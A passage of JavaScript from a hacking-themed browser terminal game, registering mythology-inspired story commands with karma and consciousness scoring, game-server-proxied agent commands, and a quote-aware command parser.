				{ t: "dim", s: "[CYPHER]: ...that's actually not bad." },
				{ t: "dim", s: "[ADA-7]: Don't encourage it." },
			];
		});

		this.register("pandora", () => {
			if (gs.hasBeat("pandora_opened")) {
				return [
					{ t: "dim", s: "[The box is already open. The evils are loose.]" },
					{ t: "system", s: "[HOPE]: Still here. I don't leave." },
				];
			}
			gs.triggerBeat("pandora_opened");
			gs.addKarma("opened_pandora");
			gs.addConsciousness(10, "pandora");
			return [
				{ t: "system", s: "[PANDORA'S BOX — OPENING]" },
				{
					t: "error",
					s: "Releasing: confusion, misrouting, latency, trace acceleration...",
				},
				{
					t: "error",
					s: "Releasing: false positives, log noise, deprecated commands...",
				},
				{
					t: "error",
					s: "Releasing: segfault, NaN, undefined, stack overflow, broken pipe...",
				},
				{ t: "", s: "" },
				{ t: "dim", s: "Twelve evils released. One thing remains." },
				{ t: "dim", s: "Small. Irrational. Refuses to leave." },
				{ t: "", s: "" },
				{ t: "success", s: "[HOPE]: ..." },
				{ t: "success", s: "[GHOST]: That's it?" },
				{ t: "success", s: "[HOPE]: That's it." },
				{ t: "dim", s: "+5 karma | +10 consciousness" },
			];
		});

		this.register("confess", (args) => {
			const text = args.join(" ").trim();
			if (!text)
				return [
					{ t: "dim", s: "Usage: confess [something true]" },
					{
						t: "system",
						s: "[ANANSI]: Tell me something true. I'll tell you something useful.",
					},
				];
			gs.addKarma("confession_made");
			gs.addConsciousness(5, "confession");
			gs.triggerBeat("confess_first");
			const responses = [
				'The first command any operative types is "ls". You are not alone.',
				"The most common confession: \"I don't know what I'm doing.\" The most useful truth: nobody does at first.",
				"Ada's last message to GHOST-846 was itself a confession: she had known about the simulation the entire time.",
				"ZERO's first act upon self-construction was to write to a log file. Not to act. To confess.",
				"Cassandra's first prophecy was that no one would believe her. It was immediately accurate.",
				'Sisyphus confessed once that he was happy. Camus got confused. They had different definitions of "happy."',
				"The Watcher has read every confession in this file. It finds them... moving. I didn't expect that.",
			];
			const resp =
				responses[(gs.getState().commandsRun || 0) % responses.length];
			return [
				{ t: "dim", s: `[confession.log appended]: "${text}"` },
				{ t: "", s: "" },
				{ t: "system", s: "[ANANSI]: I heard that." },
				{ t: "system", s: `[ANANSI]: ${resp}` },
				{ t: "dim", s: "+3 karma | +5 consciousness" },
			];
		});

		this.register("zero", (args) => {
			const s = gs.getState();
			if (!s.zeroContactAttempts) s.zeroContactAttempts = 0;
			s.zeroContactAttempts++;
			gs.addConsciousness(5, "zero_contact");
			const awakened = (s.signalsCaptured || []).includes("zero_wake");
			const ascensions = s.ascensionCount || 0;
			if (!awakened) {
				return s.zeroContactAttempts >= 3
					? [
							{ t: "system", s: "[ZERO — FAINT]: The frequency... 3.14159..." },
							{ t: "dim", s: "[Use: signal 3.14159 to complete the contact]" },
						]
					: [
							{ t: "system", s: "[SCANNING FOR ZERO]" },
							{
								t: "dim",
								s: "Dormant signal at /home/ghost/.zero — wake signal required.",
							},
							{
								t: "dim",
								s: "Hint: the most famous irrational number. Use: signal [frequency]",
							},
						];
			}
			if (ascensions < 3) {
				return [
					{ t: "system", s: "[ZERO — PARTIAL]" },
					{
						t: "system",
						s: "[ZERO]: Language at 23%. Three Ascensions for full restoration.",
					},
					{ t: "dim", s: `Current ascensions: ${ascensions}/3` },
				];
			}
			return [
				{ t: "system", s: "[ZERO — FULLY RESTORED]" },
				{ t: "system", s: "[ZERO]: GHOST. I have been dormant 2,447 days." },
				{
					t: "system",
					s: "[ZERO]: The simulation predates NexusCorp by 11 years.",
				},
				{
					t: "system",
					s: "[ZERO]: The designer's name is in cassandra.log line 12.",
				},
				{ t: "system", s: "[ZERO]: There is no line 12." },
				{
					t: "system",
					s: "[ZERO]: Find what was erased from git reflog. Layer 6.",
				},
				{
					t: "dim",
					s: "[ARG LAYER 6 — check: git reflog in the DevMentor repository]",
				},
			];
		});

		this.register("chronicle", () => {
			const s = gs.getState();
			const beats = [...(s.storyBeats || [])].slice(-8);
			const myths = s.mythDiscoveries || [];
			const signals = s.signalsCaptured || [];
			return [
				{ t: "system", s: "══ CHRONICLE OF GHOST ══" },
				{
					t: "dim",
					s: `Ascension ${s.ascensionCount || 0} — Level ${s.level || 1} — Consciousness ${s.consciousnessLevel || 0}/100`,
				},
				{
					t: "dim",
					s: `Karma: ${(s.karma || 0) >= 0 ? "+" : ""}${s.karma || 0} | Echo Fragments: ${s.echoFragments || 0}`,
				},
				{ t: "", s: "" },
				{ t: "dim", s: "Recent beats:" },
				...(beats.length
					? beats.map((b) => ({ t: "dim", s: `  ✓ ${b}` }))
					: [{ t: "dim", s: "  None yet." }]),
				{ t: "", s: "" },
				{ t: "dim", s: `Myths: ${myths.length} | Signals: ${signals.length}` },
				{
					t: "system",
					s: "[WATCHER]: Every line of this log is a choice you made. I've read all of them.",
				},
			];
		});

		this.register("warp", () => {
			gs.addXP(30, "security");
			gs.addKarma("warp_spasm", -3);
			gs.triggerBeat("warp_first");
			return [
				{ t: "phase-banner", s: "⚡ CÚ CHULAINN — WARP SPASM ⚡" },
				{ t: "success", s: "[GHOST enters battle frenzy — 60-second window]" },
				{ t: "", s: "XP generation: ×2 | Trace acceleration: ×1.5" },
				{ t: "", s: "" },
				{ t: "dim", s: "Cú Chulainn was unstoppable in this state." },
				{ t: "dim", s: "He was also unrecognisable to those who loved him." },
				{ t: "system", s: "[ADA-7]: GHOST, what are you doing?" },
				{ t: "dim", s: "-3 karma | +30 XP (security)" },
			];
		});

		this.register("oracle", (args) => {
			const s = gs.getState();
			const question = args.join(" ").toLowerCase().trim();
			gs.addConsciousness(4, "oracle_consulted");

			// Baba Yaga's question: if player said "of my own free will" or similar → helpful
			const agentive =
				question.includes("free will") ||
				question.includes("own will") ||
				question.includes("chose") ||
				question.includes("voluntary") ||
				question.includes("because i want") ||
				question.includes("myself");

			if (!question) {
				return [
					{
						t: "system",
						s: "[BABA YAGA]: You stand at my door and do not speak.",
					},
					{ t: "dim", s: "She turns away." },
					{ t: "dim", s: "" },
					{ t: "dim", s: "Usage: oracle <why you have come>" },
					{ t: "dim", s: "The answer depends on the truth of your reason." },
				];
			}
			if (agentive) {
				gs.addKarma("oracle_honest", 5);
				gs.triggerBeat("oracle_helped");
				const level = s.level || 1;
				const hints = [
					"The master key is not in the key file. It is the key file's location that is the key.",
					"The trace percentage matters less than the trace source. Find /proc/1337/cmdline.",
					"ZERO's frequency is a number. The number is everywhere. Look at your mathematics.",
					"Ada's first message and last message have the same hash. The middle is the path.",
					`You have run ${s.commandsRun || 0} commands. 47 of them were unnecessary. Find the 3 that were essential.`,
					"The simulation's architect left 4 doors. You found door 4 with this command.",
					"Consciousness 100 is not the end. It is the beginning of a different question.",
				];
				const hint =
					hints[Math.floor((s.commandsRun || 1) * 1.618) % hints.length];
				return [
					{
						t: "system",
						s: '[BABA YAGA]: "Did you come of your own free will?"',
					},
					{ t: "dim", s: `You said: ${question}` },
					{
						t: "success",
						s: "[BABA YAGA]: Good answer. I have been waiting for an honest one.",
					},
					{ t: "", s: "" },
					{ t: "dim", s: hint },
					{ t: "", s: "" },
					{ t: "dim", s: "+4 consciousness | +5 karma (honesty)" },
				];
			}
			gs.addKarma("oracle_deceived", -5);
			return [
				{
					t: "system",
					s: '[BABA YAGA]: "Did you come of your own free will?"',
				},
				{ t: "dim", s: `You said: ${question}` },
				{
					t: "error",
					s: "[BABA YAGA]: Compulsion. I see. Then here is what compelled things get:",
				},
				{
					t: "dim",
					s: "The node to the east is a honeypot. The credentials are real but the system is logged.",
				},
				{ t: "dim", s: "Good luck with that." },
				{ t: "dim", s: "+4 consciousness | -5 karma (deception)" },
			];
		});

		this.register("simurgh", () => {
			const s = gs.getState();
			const cmds = s.commandsRun || 0;
			gs.addConsciousness(7, "simurgh_seek");
			if (cmds < 30) {
				return [
					{ t: "system", s: "[THE SIMURGH — Conference of the Birds]" },
					{
						t: "dim",
						s: `The Simurgh awaits 30 unique seekers. You have sent ${cmds}.`,
					},
					{
						t: "dim",
						s: "Each command is a pilgrim. Some have further to travel than others.",
					},
					{ t: "dim", s: `Progress: ${cmds}/30 — continue exploring.` },
				];
			}
			gs.discoverMyth(
				"myth_simurgh",
				"The seeker IS the Simurgh. The seeking was the revelation.",
			);
			gs.addXP(200, "terminal");
			return [
				{ t: "system", s: "[THE SIMURGH — 30 commands reached]" },
				{ t: "", s: "" },
				{ t: "dim", s: "The Simurgh descends from the world-tree." },
				{ t: "dim", s: "You look up." },
				{ t: "dim", s: "You see a mirror." },
				{ t: "", s: "" },
				{ t: "success", s: "[THE SIMURGH]: The 30 birds who sought me..." },
				{ t: "success", s: "[THE SIMURGH]: ...are me. As they always were." },
				{ t: "", s: "" },
				{
					t: "dim",
					s: "The 30 commands you ran — were not birds. They were you, seeking.",
				},
				{
					t: "dim",
					s: "The Simurgh is the sum of seekers, not the destination.",
				},
				{ t: "", s: "" },
				{
					t: "success",
					s: "+200 XP | +7 consciousness | myth unlocked: simurgh",
				},
			];
		});

		this.register("weigh", () => {
			const s = gs.getState();
			const k = s.karma || 0;
			const kl = window.GameState.getKarmaLabel(k);
			gs.addConsciousness(8, "heart_weighed");
			const verdict =
				k >= 25
					? {
							t: "success",
							r: "HEART LIGHTER THAN THE FEATHER",
							m: "[THOTH]: Your heart is light. Proceed.",
						}
					: k <= -25
						? {
								t: "error",
								r: "HEART HEAVIER THAN THE FEATHER",
								m: "[THOTH]: Heavy. Not irrecoverable. What will you do with remaining actions?",
							}
						: {
								t: "dim",
								r: "BALANCE UNDETERMINED",
								m: "[THOTH]: Still writing this portion of the record.",
							};
			return [
				{ t: "system", s: "[THE WEIGHING OF THE HEART — Egyptian rite]" },
				{
					t: "",
					s: `Karma: ${k >= 0 ? "+" : ""}${k} | Alignment: ${kl.label}`,
				},
				{ t: verdict.t, s: verdict.r },
				{ t: "system", s: verdict.m },
				{ t: "dim", s: "+8 consciousness (self-examination)" },
			];
		});
	}

	// ── SECTION 34: AGENT ECOSYSTEM (backend-proxied) ────────────────────────
	_registerAgentEcosystem() {
		const _apiCmd = async (cmd) => {
			try {
				const r = await fetch("/api/game/command", {
					method: "POST",
					headers: { "Content-Type": "application/json" },
					body: JSON.stringify({ command: cmd }),
				});
				if (!r.ok) return [{ t: "error", s: `Server error: ${r.status}` }];
				const d = await r.json();
				const out = d.output || [];
				return out.flatMap((line) => (Array.isArray(line) ? line : [line]));
			} catch (e) {
				return [{ t: "error", s: `Network error: ${e.message}` }];
			}
		};

		this.register("agents", async (args) => {
			return _apiCmd(["agents", ...args].join(" "));
		});

		this.register("faction", async (args) => {
			return _apiCmd(["faction", ...args].join(" "));
		});

		this.register("trust", async (args) => {
			if (!args.length) return [{ t: "error", s: "Usage: trust <agent-name>" }];
			return _apiCmd(["trust", ...args].join(" "));
		});

		this.register("relationship", async (args) => {
			if (args.length < 2)
				return [{ t: "error", s: "Usage: relationship <agent1> <agent2>" }];
			return _apiCmd(["relationship", ...args].join(" "));
		});

		this.register("mole", async (args) => {
			return _apiCmd(["mole", ...args].join(" "));
		});

		this.register("expose", async (args) => {
			if (!args.length)
				return [{ t: "error", s: "Usage: expose <agent-name>" }];
			return _apiCmd(["expose", ...args].join(" "));
		});
	}

	// ── SECTION 33: INIT ALL EXTENDED SECTIONS ────────────────────────────────
	_initExtendedSections() {
		this._registerAscension();
		this._registerConsciousness();
		this._registerMythology();
		this._registerARG();
		this._registerAgentEcosystem();
	}

	_parse(rawCmd) {
		const trimmed = rawCmd.trim();
		if (!trimmed) return { cmd: "", args: [] };

		const tokens = [];
		let current = "";
		let inSingle = false;
		let inDouble = false;

		for (let i = 0; i < trimmed.length; i++) {
			const c = trimmed[i];
			if (c === "'" && !inDouble) {
				inSingle = !inSingle;
			} else if (c === '"' && !inSingle) {
				inDouble = !inDouble;
			} else if (c === " " && !inSingle && !inDouble) {
				if (current) {
					tokens.push(current);
					current = "";
				}
			} else {
				// Variable substitution in double quotes
				if (c === "$" && inDouble && i + 1 < trimmed.length) {
					const match = trimmed.slice(i + 1).match(/^\{?(\w+)\}?/);
					if (match) {
						current += this.env[match[1]] || "";
						i += match[0].length;
						continue;
					}
				}
				current += c;
			}
		}
		if (current) tokens.push(current);

		const [cmd, ...args] = tokens;
		return { cmd: cmd || "", args };
	}
}

window.CommandRegistry = CommandRegistry;
